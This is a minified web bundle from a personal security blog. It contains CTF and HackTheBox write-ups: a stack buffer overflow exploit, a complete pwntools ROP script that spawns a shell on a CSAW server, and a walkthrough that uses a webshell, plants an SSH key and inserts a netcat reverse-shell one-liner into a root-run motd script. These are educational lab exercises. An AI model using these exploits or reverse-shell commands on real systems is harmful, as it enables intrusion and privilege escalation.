_N_E=(window.webpackJsonp_N_E=window.webpackJsonp_N_E||[]).push([[6],{"38su":function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return p})),n.d(t,"default",(function(){return d}));var a=n("rePB"),r=n("Ff2n"),o=(n("q1tI"),n("7ljp")),c=n("FYTF"),i=n.n(c);function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var p={title:"Pancake (HacktivityCon CTF)",description:"HacktivityCon CTF",date:"August 1, 2020"},u={meta:p};function d(e){var t=e.components,n=Object(r.a)(e,["components"]);return Object(o.a)("wrapper",l(l(l({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(o.a)("div",{className:i.a.post},Object(o.a)("h1",null,"Pancake (HacktivityCon CTF)"),Object(o.a)("h6",null,"August 1, 2020"),Object(o.a)("p",null,Object(o.a)("strong",{parentName:"p"},"Description")),Object(o.a)("p",null,"Pancake is a simple binary exploitation challenge from HacktivityCon CTF.\nEntering a long string causes a buffer overflow and pancake segfaults. Some familiarity with radare2 and the call stack will be helpful going through this writeup. A great guide on radare2 can be found ",Object(o.a)("a",l({parentName:"p"},{href:"https://www.megabeets.net/a-journey-into-radare-2-part-1/"}),"here"),"."),Object(o.a)("p",null,Object(o.a)("strong",{parentName:"p"},"Analysis")),Object(o.a)("p",null,"Load and analyze the binary in radare2. The stack is not executable, but the file isn't protected by ",Object(o.a)("a",l({parentName:"p"},{href:"https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries"}),"canaries")," nor compiled with support for ",Object(o.a)("a",l({parentName:"p"},{href:"https://en.wikipedia.org/wiki/Position-independent_code"}),"position independent code"),". This means that there is no protection against buffer overflows and the segments will always be loaded to the same location."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ r2 -A pancakes\n[0x00400700]> iI\narch     x86\nbaddr    0x400000\nbinsz    6995\nbintype  elf\nbits     64\ncanary   false\nnx       true\npic      false\n... (output truncated)\n"))),Object(o.a)("p",null,"List function symbols within the binary. Although most of the functions are from C libraries and calls used by the program, two of them stand out. One of them is ",Object(o.a)("code",null,"main"),", which is always worth checking out. The second is ",Object(o.a)("code",null,"secret_recipe"),", which seems to be a user defined function."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> afl\n0x00400700    1 42           entry0\n0x00400740    4 42   -> 37   sym.deregister_tm_clones\n0x00400770    4 58   -> 55   sym.register_tm_clones\n0x004007b0    3 34   -> 29   sym.__do_global_dtors_aux\n0x004007e0    1 7            entry.init0\n0x00400a70    1 2            sym.__libc_csu_fini\n0x00400a74    1 9            sym._fini\n0x0040098b    1 113          sym.secret_recipe\n0x004006d0    1 6            sym.imp.fopen\n0x00400690    1 6            sym.imp.fread\n0x00400680    1 6            sym.imp.puts\n0x00400a00    4 101          sym.__libc_csu_init\n0x00400730    1 2            sym._dl_relocate_static_pie\n0x004007e7   10 420          main\n0x00400648    3 23           sym._init\n0x00400670    1 6            sym.imp.putchar\n0x004006a0    1 6            sym.imp.printf\n0x004006b0    1 6            sym.imp.gets\n0x004006c0    1 6            sym.imp.setvbuf\n0x004006e0    1 6            sym.imp.atoi\n0x004006f0    1 6            sym.imp.usleep\n0x004000ea    1 2            fcn.004000ea\n"))),Object(o.a)("p",null,"Firstly, examine the ",Object(o.a)("code",null,"secret_recipe")," because it's supposed to be a secret. Going over the disassembly, the function is simple. ",Object(o.a)("code",null,"secret_recipe")," opens a file named ",Object(o.a)("code",null,"flag.txt"),", reads it contents and prints it out."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> pdf @ sym.secret_recipe\n... (output truncated, radare comments removed for better readability)\n0x004009a5       488d3dce0200.   lea rdi, str.flag.txt\n0x004009ac       e81ffdffff      call sym.imp.fopen\n0x004009b1       488945f0        mov qword [stream], rax\n0x004009b5       488b55f0        mov rdx, qword [stream]\n0x004009b9       488d8560ffff.   lea rax, [ptr]\n0x004009c0       4889d1          mov rcx, rdx\n0x004009c3       ba80000000      mov edx, 0x80\n0x004009c8       be01000000      mov esi, 1\n0x004009cd       4889c7          mov rdi, rax\n0x004009d0       e8bbfcffff      call sym.imp.fread\n0x004009f4       e887fcffff      call sym.imp.puts\n"))),Object(o.a)("p",null,"Next, skimming through the disassembly for ",Object(o.a)("code",null,"main"),", the function also seems fairly straightforward - prints some stuff, gets user input and prints more stuff. ",Object(o.a)("code",null,"main")," uses the ",Object(o.a)("code",null,"gets")," function to get input. ",Object(o.a)("code",null,"gets")," is a deprecated function that does not peform checks on input length, leading to potential buffer overflows exploits. This explains the segfault upon passing in a long string."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> pdf @ main\n... (output truncated, radare comments removed for better readability)\n0x0040085b      e860feffff     call sym.imp.setvbuf\n0x00400860      488d3d510300.  lea rdi, str.Welcome_to_the_pancake_stacker\n0x00400867      e814feffff     call sym.imp.puts\n0x0040086c      488d3d650300.  lea rdi, str.How_many_pancakes_do_you_want\n0x00400873      e808feffff     call sym.imp.puts\n0x00400878      488d8570ffff.  lea rax, [str]\n0x0040087f      4889c7         mov rdi, rax\n0x00400882      b800000000     mov eax, 0\n0x00400887      e824feffff     call sym.imp.gets\n0x0040088c      488d8570ffff.  lea rax, [str]\n0x00400893      4889c7         mov rdi, rax\n0x00400896      b800000000     mov eax, 0\n0x0040089b      e840feffff     call sym.imp.atoi\n0x004008a0      8945f0         mov dword [var_10h], eax\n0x004008a3      488d3d4d0300.  lea rdi, str.Cooking_your_cakes\n0x004008aa      b800000000     mov eax, 0\n0x004008af      e8ecfdffff     call sym.imp.printf\n... (output truncated)\n"))),Object(o.a)("p",null,"Note that ",Object(o.a)("code",null,"main")," does not make a call to ",Object(o.a)("code",null,"secret_recipe"),". Maybe the vulnerable ",Object(o.a)("code",null,"gets")," can be exploited to overwrite the return address on the stack?\n",Object(o.a)("strong",{parentName:"p"},"Exploitation"),"\nTo craft the payload, we need to identify the offset in our buffer where the return address will be placed. To do so, generate a ",Object(o.a)("a",l({parentName:"p"},{href:"https://en.wikipedia.org/wiki/De_Bruijn_sequence"}),"De Bruijn Sequence")," long enough string to cause a segfault. The sequence can be generated by using ",Object(o.a)("code",null,"ragg2"),", which is part of the radare project."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ ragg2 -P 200 -r\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%\n"))),Object(o.a)("p",null,"Run radare2 in debug mode ",Object(o.a)("code",null,"r2 -d ./pancake"),". Analyze the binary and set a breakpoint at the ",Object(o.a)("code",null,"ret")," instruction in ",Object(o.a)("code",null,"main"),". This will pause execution of the program just before the ",Object(o.a)("code",null,"main")," function exits, allowing us to examine the stack. ",Object(o.a)("code",null,"dc")," to begin execution of the program, passing the De Bruijn Sequence when prompted. Since we have placed a breakpoint at the end of main, the program should pause execution. Print the first 16 bytes on the stack using ",Object(o.a)("code",null,"pxw 8 @ rsp"),". Using the first four bytes on the stack, calculate the offset using the command ",Object(o.a)("code",null,"wopO 0x41417a41"),". This is where we will place the address to ",Object(o.a)("code",null,"secret_recipe"),"."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> pdf @ main\n... (output truncated)\n0x00400984      b800000000     mov eax, 0\n0x00400989      c9             leave\n0x0040098a      c3             ret\n[0x00400700]> db 0x0040098a\n[0x00400700]> dc\n... (output truncated)\nhit breakpoint at: 40098a\n[0x0040098a]> pxw 16 @ rsp\n0x7ffffe1723b8  0x41417a41 0x32414131 0x41334141 0x41413441  AzAA1AA2AA3AA4AA\n[0x0040098a]> wopO 0x41417a41\n152\n"))),Object(o.a)("p",null,"The final payload will be just a buffer of 152 bytes with the address of ",Object(o.a)("code",null,"secret_recipe")," added onto the end. Since data is stored and loaded in little endian format on x86, the address to ",Object(o.a)("code",null,"secret_recipe")," must be passed with the same endianess. Pwntools can be used to easily convert the address into little endian format, instead of doing it manually, which can be tedious. Finally create a file (if it does not already exist) in the same directory named ",Object(o.a)("code",null,"file.txt")," to test the payload."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ cat flag.txt\nFLAG{HASH123}\n$ python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\" | ./pancakes\n...(output truncated)\nFLAG{HASH123}\n[1]    17531 done                              python -c  |\n       17532 segmentation fault (core dumped)  ./pancakes\n"))),Object(o.a)("p",null,"With the payload working, throw it over netcat to capture the flag."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ {python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\";cat;} | nc jh2i.com 50021\nWelcome to the pancake stacker!\nHow many pancakes do you want?\nCooking your cakes.....\nSmothering them in butter.....\nDrowning them in syrup.....\nThey're ready! Our waiters are bringing them out now...\n        _____________\n       /    ___      \\\\\n      ||    \\\\__\\\\     ||\n      ||      _      ||\n      |\\\\     /\\ \\     /|\n      \\\\ \\\\___/ ^ \\\\___/ /\n      \\\\\\\\____/_^_\\\\____//_\n    __\\\\\\\\____/_^_\\\\____// \\\\\n   /   \\____/_^_\\____/ \\\\ \\\\\n  //                   , /\n  \\\\\\\\___________   ____  /\n               \\\\_______/\nflag{too_many_pancakes_on_the_stack}\n")))))}d.isMDXComponent=!0},"4e3q":function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return p})),n.d(t,"default",(function(){return d}));var a=n("rePB"),r=n("Ff2n"),o=(n("q1tI"),n("7ljp")),c=n("FYTF"),i=n.n(c);function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var p={title:"DirtyCOW (CVE-2016-5195)",description:"DirtyCOW (CVE-2016-5195)",date:"October 27, 2020"},u={meta:p};function d(e){var t=e.components,n=Object(r.a)(e,["components"]);return Object(o.a)("wrapper",l(l(l({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(o.a)("div",{className:i.a.post},Object(o.a)("h1",null,"DirtyCOW"),Object(o.a)("h6",null,"October 27, 2020"),Object(o.a)("p",null,"A paper on DirtyCOW (CVE-2016-5195) written for UMass CS460 Introduction to Computer and Network Security.\nLink to ",Object(o.a)("a",l({parentName:"p"},{href:"https://notakay.s3.ap-south-1.amazonaws.com/dirtycow.pdf"}),"paper"),".")))}d.isMDXComponent=!0},"7ljp":function(e,t,n){"use strict";n.d(t,"a",(function(){return b}));var a=n("q1tI"),r=n.n(a);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function c(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?c(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):c(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=r.a.createContext({}),p=function(e){var t=r.a.useContext(l),n=t;return e&&(n="function"===typeof e?e(t):i(i({},t),e)),n},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.a.createElement(r.a.Fragment,{},t)}},d=r.a.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,l=s(e,["components","mdxType","originalType","parentName"]),d=p(n),b=a,f=d["".concat(c,".").concat(b)]||d[b]||u[b]||o;return n?r.a.createElement(f,i(i({ref:t},l),{},{components:n})):r.a.createElement(f,i({ref:t},l))}));function b(e,t){var n=arguments,a=t&&t.mdxType;if("string"===typeof e||a){var o=n.length,c=new Array(o);c[0]=d;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i.mdxType="string"===typeof e?e:a,c[1]=i;for(var l=2;l<o;l++)c[l]=n[l];return r.a.createElement.apply(null,c)}return r.a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},BR8T:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/blog",function(){return n("YbiN")}])},DHDw:function(e,t,n){var a={"./dirtycow/index.mdx":"4e3q","./pancake/index.mdx":"38su","./return-to-what/index.mdx":"e7F1","./roppity/index.mdx":"aQzF","./traceback/index.mdx":"XZt4"};function r(e){var t=o(e);return n(t)}function o(e){if(!n.o(a,e)){var t=new Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}return a[e]}r.keys=function(){return Object.keys(a)},r.resolve=o,e.exports=r,r.id="DHDw"},FYTF:function(e,t,n){e.exports={post:"post_post__1Lsln",codeblock:"post_codeblock__jpvW3"}},Ff2n:function(e,t,n){"use strict";function a(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}n.d(t,"a",(function(){return a}))},XZt4:function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return p})),n.d(t,"default",(function(){return d}));var a=n("rePB"),r=n("Ff2n"),o=(n("q1tI"),n("7ljp")),c=n("FYTF"),i=n.n(c);function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var p={title:"Traceback (HackTheBox)",description:"HackTheBox",date:"August 19, 2020"},u={meta:p};function d(e){var t=e.components,n=Object(r.a)(e,["components"]);return Object(o.a)("wrapper",l(l(l({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(o.a)("div",{className:i.a.post},Object(o.a)("h1",null,"Traceback (HackTheBox)"),Object(o.a)("h6",null,"August 19, 2020"),Object(o.a)("p",null,"Started the box by enumerating services on the machine using nmap. Nmap scan returned http and ssh services which weren't that interesting."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"# Nmap 7.80 scan initiated Wed May 20 06:40:09 2020 as: nmap -sV -sT -oN nmap 10.10.10.181\nNmap scan report for 10.10.10.181\nHost is up (0.094s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed May 20 06:40:21 2020 -- 1 IP address (1 host up) scanned in 11.59 seconds\n"))),Object(o.a)("p",null,"Going to ",Object(o.a)("a",l({parentName:"p"},{href:"http://10.10.10.181"}),"http://10.10.10.181"),", the website had already been owned by Xh4H and the hacker claims to have left a backdoor somewhere."),Object(o.a)("p",null,"Running directory bruteforcing using Daniel Miessler's wordlists returned zero results. However, upon checking the page source, there's a comment saying \"Some of the best web shells that you might need\".\nThrowing that string into Google took me to a Github repo ",Object(o.a)("a",l({parentName:"p"},{href:"https://github.com/TheBinitGhimire/Web-Shells"}),"https://github.com/TheBinitGhimire/Web-Shells"),"."),Object(o.a)("p",null,"Going through the list of backdoors, ",Object(o.a)("a",l({parentName:"p"},{href:"http://10.10.10.181/smevk.php"}),"http://10.10.10.181/smevk.php")," returned a ",Object(o.a)("code",null,"HTTP 200 OK"),". Using the default credentials ",Object(o.a)("code",null,"admin:admin"),", I was able to gain access to the webshell.\nThe webshell's interface was really ugly, but it was sufficient to do some basic enumeration."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"# Determine user\n$ whoami\nwebadmin\n\n# Check home directory\n$ ls -a /home/webadmin\n. .. .bash_history .bash_logout .bashrc .cache .local .luvit_history .profile .ssh note.txt\n\n# Read note.txt\n$ cat /home/webadmin/note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\n\n# List user privileges\n$ sudo -l\nMatching Defaults entries for webadmin on traceback:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser webadmin may run the following commands on traceback:\n    (sysadmin) NOPASSWD: /home/sysadmin/luvit\n"))),Object(o.a)("p",null,"Looking through the results, it seems ",Object(o.a)("code",null,"/home/sysadmin/luvit")," can be executed as the user ",Object(o.a)("code",null,"sysadmin")," without authentication."),Object(o.a)("p",null,"I had never written a single line of Lua code before and after doing some googling it seems that Luvit is a runtime environment for Lua.\nReading through the documentation I tried to craft some lua payload which will be executed as ",Object(o.a)("code",null,"sysadmin"),"."),Object(o.a)("p",null,"The following lua code lists files in ",Object(o.a)("code",null,"/home/sysadmin")),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"directory='/home/sysadmin/'\npfile = io.popen('ls -a \"'..directory..'\"')\nfor filename in pfile:lines() do\n    print(filename)\nend\n"))),Object(o.a)("p",null,"To execute this piece of code, I simply had to write this code somewhere on the box and run it using luvit. To do so, I echoed my code to ",Object(o.a)("code",null,"/tmp/")," on the box and ran it."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ echo \"directory='/home/sysadmin/';pfile = io.popen('ls -a \\\\\"'..directory..'\\\\\"');for filename in pfile:lines() do;print(filename);end\" > /tmp/listdir.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/listdir.lua\n. .. .bash_history .bash_logout .bashrc .cache .local .profile .ssh luvit user.txt\n\n"))),Object(o.a)("p",null,"Modifying the payload to print ",Object(o.a)("code",null,"/home/sysadmin/user.txt"),", I got my first flag."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ echo \"pfile = io.popen('cat /home/sysadmin/user.txt');for filename in pfile:lines() do;print(filename);end\" > /tmp/getflag.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/getflag.lua\n{{FLAG}}\n\n"))),Object(o.a)("p",null,"Enumerating through sysadmin's home folder, I found the ",Object(o.a)("code",null,".ssh")," folder with the ",Object(o.a)("code",null,"authorized_keys")," file. Adding my public key to this file should grant me ssh access as sysadmin to the box.\nUsing ",Object(o.a)("code",null,"ssh-keygen"),", I created a new ssh keypair. The payload adds my public key to the list of authorized keys. "),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),'$ echo "io.popen(\\\\"echo \'{{PUBLIC KEY}}\' >> /home/sysadmin/.ssh/authorized_keys\\\\")" > /tmp/ssh.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/ssh.lua\n'))),Object(o.a)("p",null,"Ssh-ed into the box using ",Object(o.a)("code",null,"ssh -i PRIVATE_KEY ",Object(o.a)("a",l({parentName:"p"},{href:"mailto:sysadmin@10.10.10.181"}),"sysadmin@10.10.10.181"))," and I was greeted by a message from Xh4h and a shell."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"\u279c  ~ ssh -i PRIVATE_KEY sysadmin@10.10.10.181\n#################################\n-------- OWNED BY XH4H  ---------\n- I guess stuff could have been configured better ^^ -\n#################################\n\nWelcome to Xh4H land \n\n$\n"))),Object(o.a)("p",null,"Trying to privilege escalate from sysadmin to root was kinda tricky. I tried looking for files with incorrect permisions or suid binaries but found nothing. However looking through the list of processes using ",Object(o.a)("code",null,"ps -aux"),", there was a command being executed as root that seemed to be running at intervals."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"root       3851  0.0  0.0   4628   772 ?        Ss   19:15   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\n"))),Object(o.a)("p",null,"The command seems to be restoring a backup of the message of the day (motd), which is a service that can be used to print custom greeting messages upon login - similar to the greeting from Xh4h upon ssh-ing into the box."),Object(o.a)("p",null,"Looking through ",Object(o.a)("code",null,"/etc/update-motd.d/"),", there were several messages and the first one ",Object(o.a)("code",null,"/etc/update-motd.d/00-header")," contained ",Object(o.a)("code",null,'echo "\\nWelcome to Xh4H land \\n"'),", which was the greeting upon logging into the box. This could be abused by adding commands to run upon login, which will be run as root."),Object(o.a)("p",null,"I set up a reverse shell listener on port 1337 on my local machine. Afterwards, I edited ",Object(o.a)("code",null,"/etc/update-motd.d/00-header")," to set up a netcat reverse shell connector. "),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ipaddr}} 1337 >/tmp/f; echo "\\nWelcome to Xh4Hland \\n"\n'))),Object(o.a)("p",null,"In a different window, ssh into the box and monitor the reverse shell listener. Note that it may require a few tries since the motd gets overwritten every 30 seconds. If timed correctly you should have access to the root shell. Navigate to ",Object(o.a)("code",null,"/root")," to grab the root flag."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ cat /root/root.txt\n{{FLAG}}\n\n")))))}d.isMDXComponent=!0},YFqc:function(e,t,n){e.exports=n("cTJO")},YbiN:function(e,t,n){"use strict";n.r(t),n.d(t,"default",(function(){return u}));var a=n("nKUr"),r=n("vRNQ"),o=n.n(r);var c,i=(c=n("DHDw"),c.keys().map((function(e){return{link:e.substr(1).replace(/\/index\.mdx?$/,""),module:c(e)}}))).sort((function(e,t){return new Date(t.module.meta.date)-new Date(e.module.meta.date)})),s=n("YFqc"),l=n.n(s);function p(e){return Object(a.jsxs)(a.Fragment,{children:[Object(a.jsx)(l.a,{href:"/blog"+e.post.link,children:Object(a.jsx)("a",{className:o.a.link,children:e.post.module.meta.title})}),Object(a.jsx)("br",{})]})}function u(){return Object(a.jsxs)("div",{className:o.a.container,children:[Object(a.jsx)("div",{className:o.a.intro,children:Object(a.jsx)("h1",{className:o.a.header1,children:"Blog"})}),i.map((function(e){return Object(a.jsx)(p,{post:e},e.link)}))]})}},aQzF:function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return p})),n.d(t,"default",(function(){return d}));var a=n("rePB"),r=n("Ff2n"),o=(n("q1tI"),n("7ljp")),c=n("FYTF"),i=n.n(c);function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var p={title:"Roppity (CSAW CTF Quals 2020)",description:"(CSAW CTF Quals 2020)",date:"September 14, 2020"},u={meta:p};function d(e){var t=e.components,n=Object(r.a)(e,["components"]);return Object(o.a)("wrapper",l(l(l({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(o.a)("div",{className:i.a.post},Object(o.a)("h1",null,"Roppity (CSAW CTF Quals 2020)"),Object(o.a)("h6",null,"September 14, 2020"),Object(o.a)("p",null,"The executable was compiled without support for position independent code. Because of this, a ROP chain could be built to leak the address of the ",Object(o.a)("code",null,"puts")," function in ",Object(o.a)("code",null,"libc")," through the global offset table. The executable was restarted by jumping back to ",Object(o.a)("code",null,"_","start"),". Using the address of ",Object(o.a)("code",null,"puts"),", the address of ",Object(o.a)("code",null,"system")," in ",Object(o.a)("code",null,"libc")," was calculated, which was used to spawn a shell."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"from pwn import *\n\n#target = process('./rop')\n#libc = ELF('/usr/lib/libc.so.6')\n\n# pwn.chal.csaw.io 5016\ntarget = remote('pwn.chal.csaw.io', 5016)\nlibc = ELF('libc-2.27.so')\n\npop_rdi = 0x400683\ngot_puts = 0x601018\nplt_puts = 0x4004a0\nret = 0x40048e\nstart = 0x4004d0\n\npayload = b''\npayload += b'A'*40\npayload += p64(pop_rdi)\npayload += p64(got_puts) # leak addr\npayload += p64(plt_puts) # print address of puts in libc\npayload += p64(start) # restart\n\ntarget.recv() # Hello\ntarget.sendline(payload)\nlibc_puts = int.from_bytes((target.recv()[:-7]), byteorder='little') # Remove the second b'Hello\\n'\n\nlibc.address = libc_puts - libc.symbols['puts']\n\nbin_sh = next(libc.search(b'/bin/sh'))\n\nlibc_system = libc.symbols['system']\n\npayload = b''\npayload += b'A' * 40\npayload += p64(pop_rdi)\npayload += p64(bin_sh)\npayload += p64(ret)\npayload += p64(libc_system)\n\ntarget.sendline(payload)\ntarget.interactive()\n")))))}d.isMDXComponent=!0},cTJO:function(e,t,n){"use strict";var a=n("J4zp"),r=n("284h");t.__esModule=!0,t.default=void 0;var o=r(n("q1tI")),c=n("elyg"),i=n("nOHt"),s=n("vNVm"),l={};function p(e,t,n,a){if((0,c.isLocalURL)(t)){e.prefetch(t,n,a).catch((function(e){0}));var r=a&&"undefined"!==typeof a.locale?a.locale:e&&e.locale;l[t+"%"+n+(r?"%"+r:"")]=!0}}var u=function(e){var t=!1!==e.prefetch,n=(0,i.useRouter)(),r=n&&n.pathname||"/",u=o.default.useMemo((function(){var t=(0,c.resolveHref)(r,e.href,!0),n=a(t,2),o=n[0],i=n[1];return{href:o,as:e.as?(0,c.resolveHref)(r,e.as):i||o}}),[r,e.href,e.as]),d=u.href,b=u.as,f=e.children,m=e.replace,h=e.shallow,y=e.scroll,O=e.locale;"string"===typeof f&&(f=o.default.createElement("a",null,f));var j=o.Children.only(f),g=j&&"object"===typeof j&&j.ref,_=(0,s.useIntersection)({rootMargin:"200px"}),w=a(_,2),v=w[0],x=w[1],A=o.default.useCallback((function(e){v(e),g&&("function"===typeof g?g(e):"object"===typeof g&&(g.current=e))}),[g,v]);(0,o.useEffect)((function(){var e=x&&t&&(0,c.isLocalURL)(d),a="undefined"!==typeof O?O:n&&n.locale,r=l[d+"%"+b+(a?"%"+a:"")];e&&!r&&p(n,d,b,{locale:a})}),[b,d,x,O,t,n]);var 